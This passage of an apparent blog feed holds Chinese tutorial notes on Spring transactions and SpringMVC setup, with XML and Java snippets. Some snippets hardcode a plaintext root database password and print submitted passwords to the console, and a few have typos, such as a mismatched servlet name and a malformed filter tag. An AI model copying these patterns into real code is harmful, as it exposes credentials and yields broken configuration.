class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.40<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/druid --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span> 1.0.18<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="配置Druid连接池"><a href="#配置Druid连接池" class="headerlink" title="配置Druid连接池"></a>配置Druid连接池</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    druid连接池--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.alibaba.druid.pool.DruidDataSource&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/spring?characterEncoding=utf-8<span class="symbol">&amp;amp;</span>useSSL=false&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;86795462m&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClassName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    用来操作数据源的操作模板 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;jdbcTemplate&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.core.JdbcTemplate&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired(required = false)</span></span><br><span class="line"><span class="keyword">private</span> JdbcTemplate jdbcTemplate;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">addMoney</span><span class="params">(Account account)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> jdbcTemplate.update(<span class="string">&quot;update account set money=money+? where id=?&quot;</span>,account.getMoney().toString(),</span><br><span class="line">            account.getId());</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">transfer</span><span class="params">(Integer in, Integer out, BigDecimal money)</span> </span>&#123;</span><br><span class="line">    Account inUser = <span class="keyword">new</span> Account();</span><br><span class="line">    inUser.setId(in);</span><br><span class="line">    inUser.setMoney(money);</span><br><span class="line">    <span class="keyword">int</span> i=accountDao.addMoney(inUser);</span><br><span class="line"></span><br><span class="line">    Account outUser = <span class="keyword">new</span> Account();</span><br><span class="line">    outUser.setId(out);</span><br><span class="line">    outUser.setMoney(money);</span><br><span class="line">    <span class="keyword">int</span> i1 = accountDao.decrease(outUser);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ApplicationContext applicationContext = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">AccountService accountService= (AccountService) applicationContext.getBean(<span class="string">&quot;accountServiceImpl&quot;</span>);</span><br><span class="line">accountService.transfer(<span class="number">1</span>,<span class="number">2</span>,<span class="keyword">new</span> BigDecimal(<span class="number">20</span>));</span><br></pre></td></tr></table></figure>



<h1 id="6、事务管理"><a href="#6、事务管理" class="headerlink" title="6、事务管理"></a>6、事务管理</h1><blockquote>
<p>出现异常支持事务回滚</p>
</blockquote>
<h2 id="注解形式-1"><a href="#注解形式-1" class="headerlink" title="注解形式"></a>注解形式</h2><blockquote>
<p>在连接点加上注解<code>@transactional</code></p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--   事务管理器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;transactionManager&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--开启事务控制的注解支持--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:annotation-driven</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="配置切面"><a href="#配置切面" class="headerlink" title="配置切面"></a>配置切面</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 1、配置事务增强 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">&quot;txAdvice&quot;</span> <span class="attr">transaction-manager</span>=<span class="string">&quot;transactionManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 当方法被切点选中之后，不是直接被通知，还要过一次筛选 --&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 要增强的方法,query*开头的方法 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;query*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;SUPPORTS&quot;</span> <span class="attr">isolation</span>=<span class="string">&quot;DEFAULT&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;select*&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;SUPPORTS&quot;</span> <span class="attr">isolation</span>=<span class="string">&quot;DEFAULT&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;transfer&quot;</span> <span class="attr">propagation</span>=<span class="string">&quot;REQUIRED&quot;</span> <span class="attr">isolation</span>=<span class="string">&quot;DEFAULT&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置切面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;txPC&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* dm.demo..*.service.impl.*.*(..))&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--      事务引用+切面引用--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;txAdvice&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;txPC&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>spring</category>
      </categories>
      <tags>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringMVC</title>
    <url>/2020/12/01/02springMVC/</url>
    <content><![CDATA[<h1 id="三层架构和MVC模型"><a href="#三层架构和MVC模型" class="headerlink" title="三层架构和MVC模型"></a>三层架构和MVC模型</h1><p>咱们开发服务器端程序，一般都基于两种形式，一种C/S架构程序(客户端和服务端)，一种B/S架构程序(浏览器和服务端)</p>
<p>在 JavaEE 开发中，几乎全都是基于 B/S 架构的开发。那么在 B/S 架构中，系统标准的三层架构 包括：表现层、业务层、持久层。    </p>
<h2 id="三层架构"><a href="#三层架构" class="headerlink" title="三层架构"></a>三层架构</h2><p><strong>表现层</strong></p>
<p>也就是我们常说的web层。它负责接收客户端请求，向客户端响应结果，通常客户端使用http协议请求 web 层，web 需要接收 http 请求，完成 http 响应。 </p>
<p>表现层包括展示层和控制层：控制层负责接收请求，展示层负责结果的展示。 表现层依赖业务层，接收到客户端请求一般会调用业务层进行业务处理，并将处理结果响应给客户端。 表现层的设计一般都使用 MVC 模型。（MVC 是表现层的设计模型，和其他层没有关系）</p>
<a id="more"></a> 

<p><strong>业务层</strong></p>
<p>也就是我们常说的 service 层。它负责业务逻辑处理，和我们开发项目的需求息息相关。web 层依赖业 务层，但是业务层不依赖 web 层。 业务层在业务处理时可能会依赖持久层，如果要对数据持久化需要保证事务一致性。（也就是我们说的， 事务应该放到业务层来控制） </p>
<p><strong>持久层</strong></p>
<p>也就是我们是常说的 dao 层。负责数据持久化，包括数据层即数据库和数据访问层，数据库是对数据进 行持久化的载体，数据访问层是业务层和持久层交互的接口，业务层需要通过数据访问层将数据持久化到数据库 中。通俗的讲，持久层就是和数据库交互，对数据库表进行增删改查的。</p>
<h2 id="MVC模型"><a href="#MVC模型" class="headerlink" title="MVC模型"></a>MVC模型</h2><p>model view controller,一种用于设计创建Web应用程序表现层的模式</p>
<p><strong>Model模型</strong>：数据模型，用于封装数据</p>
<p><strong>View视图</strong>：展示数据，视图是依据模型数据创建的</p>
<p><strong>Controller控制器</strong>：应用程序中处理用户交互的部分，处理程序逻辑</p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ol>
<li>基于java实现的MVC设计模型的请求驱动类型的轻量级WEB框架</li>
<li>提供构建Web应用程序的全功能MVC模块</li>
<li>表现层框架(<strong>controller层由SpringMVC来管理</strong>)</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.6.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.mangofactory/swagger-springmvc --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mangofactory<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>swagger-springmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h1><p><strong>1、配置web.xml</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    springMVC核心类</span></span><br><span class="line"><span class="comment">        配置前端控制器</span></span><br><span class="line"><span class="comment"> --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springDispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--     配置Servlet初始化参数,加载spring-mvc配置文件--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext-mvc.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        启动服务器，创建该servlet--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        所有请求交由springMVC的前端控制器DispatcherServlet处理</span></span><br><span class="line"><span class="comment">        / 静态动态web资源</span></span><br><span class="line"><span class="comment">        /* 动态web资源</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springDispatherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>！！！整合Spring</strong></p>
<blockquote>
<p>监听器是沟通spring和web服务器的桥梁，整合spring和springMVC</p>
<p>目的：在项目启动时，就加载applicationContext.xml配置文件</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--   给监听器提供参数，必须使用全局参数，全局参数注入到servletContext中--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--    使用spring的webServlet监听器，在服务启动时创建spring容器</span></span><br><span class="line"><span class="comment">            是连接spring和服务器的桥梁</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>2、配置springmvc.xml</strong></p>
<blockquote>
<p>由于dispatcherServlet会拦截一切请求，包括静态资源，需要开启对静态资源的访问支持</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--扫描整个工程，但是只处理controller    --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;dm&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    开启mvc的注解支持--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--开启默认的对静态资源文件访问支持--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    默认的解析jsp的视图解析器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/web/WEB-INF/jsp/&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.jsp&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>3、编写index.jsp和controller层</strong></p>
<p>1.index.jsp</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;h3&gt;入门案例&lt;/h3&gt;</span><br><span class="line">	&lt;a href=&quot;$&#123; pageContext.request.contextPath &#125;/hello&quot;&gt;入门案例&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p>2.helloController</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/1&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(ModelMap modelMap, User user, <span class="meta">@RequestParam(required = true)</span>String password, String username)</span> <span class="keyword">throws</span> JsonProcessingException </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;11&quot;</span>);</span><br><span class="line">    System.out.println(username+password);</span><br><span class="line"></span><br><span class="line">    modelMap.addAttribute(<span class="string">&quot;username&quot;</span>,username);</span><br><span class="line">    modelMap.addAttribute(<span class="string">&quot;password&quot;</span>,password);</span><br><span class="line"></span><br><span class="line">    System.out.println(user.getPassword());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/web/WEB-INF/jsp/index.jsp&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>4、启动tomcat服务器</strong></p>
<h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p><img src="https://csn.damyoung.cn/SpringMVC%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B.jpg"></p>
<ol>
<li>用户发送的请求首先都会被<strong>前端控制器（中央控制器）</strong><code>DispatcherServlet</code>捕获</li>
<li>中央控制器通过<strong>处理器映射器</strong><code>HandleMapping</code>找到对应的处理器返回给中央控制器</li>
<li>中央控制器根据返回的处理器调用<strong>处理器适配器</strong><code>HandleAdapter</code>，处理器适配器经过适配调用具体的Controller，并将得到的ModelAndView返回给中央控制器</li>
<li>中央控制器将结果传递给<strong>视图解析器</strong><code>ViewReslover</code></li>
<li>视图解析器解析后返回具体视图</li>
</ol>
<h1 id="分发请求"><a href="#分发请求" class="headerlink" title="分发请求"></a>分发请求</h1><blockquote>
<p>有三种形式</p>
<p>所有请求都交给springMVC<strong>前端控制器</strong><code>DispatcherServlet</code>处理</p>
<ul>
<li>/ 静态与动态的web资源     /* 动态的web资源</li>
</ul>
<p>beanName</p>
<p>simpleUrl</p>
<p>annotation</p>
</blockquote>
<h2 id="beanName"><a href="#beanName" class="headerlink" title="beanName"></a>beanName</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;helloController&quot;</span> <span class="attr">name</span>=<span class="string">&quot;/hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;dm.demo.project.web.controller.HelloController&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="SimpleUrl"><a href="#SimpleUrl" class="headerlink" title="SimpleUrl"></a>SimpleUrl</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.handler.SimpleUrlHandlerMapping&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;mappings&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;/1&quot;</span>&gt;</span>helloController<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;/2&quot;</span>&gt;</span>helloController<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;/3&quot;</span>&gt;</span>helloController<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--开启mvc的注解支持--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--开启默认的对静态资源文件访问支持--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- exclude开启注解扫描 base-package 从哪一个包开始扫描类型是字符串 但是如果要从多个包开始扫描，中间可以用，隔开，而且支持通配符 --&gt;</span></span><br><span class="line">&lt;context:component-scan</span><br><span class="line">        base-package=&quot;dm&quot; &gt;</span><br><span class="line">    &lt;context:exclude-filter</span><br><span class="line">            type=&quot;annotation&quot;</span><br><span class="line">            expression=&quot;org.springframework.stereotype.Controller&quot;/&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--include 扫描整个工程，但是只处理controller    --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;dm&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:include-filter</span> <span class="attr">type</span>=<span class="string">&quot;annotation&quot;</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">expression</span>=<span class="string">&quot;org.springframework.stereotype.Controller&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id=""><a href="#" class="headerlink" title=""></a></h5><h1 id="传入注解参数"><a href="#传入注解参数" class="headerlink" title="传入注解参数"></a>传入注解参数</h1><h2 id="RequestMapping"><a href="#RequestMapping" class="headerlink" title="@RequestMapping"></a>@RequestMapping</h2><ol>
<li>建立请求url和处理方法之间的对应关系</li>
<li>可以作用类(一级访问目录)，作用在方法上(二级访问目录)，加上”<code>/</code>“</li>
<li>属性<ol>
<li>path 请求路径的url  </li>
<li>value等同于path属性</li>
<li>method：请求该方法的请求方式</li>
<li>params : 指定限制请求参数的条件</li>
</ol>
</li>
</ol>
<p>请求参数中文乱码解决</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置过滤器，解决中文乱码的问题 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>characterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-</span>				     <span class="attr">class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filterclass</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 指定字符集 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>characterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="RequestParam"><a href="#RequestParam" class="headerlink" title="@RequestParam"></a>@RequestParam</h2><p>作用：把请求中的指定名称的参数传递给控制器中的形参赋值</p>
<p>属性 </p>
<ol>
<li> value: 请求参数的名称</li>
<li>required: 请求url是否必须提供该参数，默认true(必须提供)</li>
</ol>
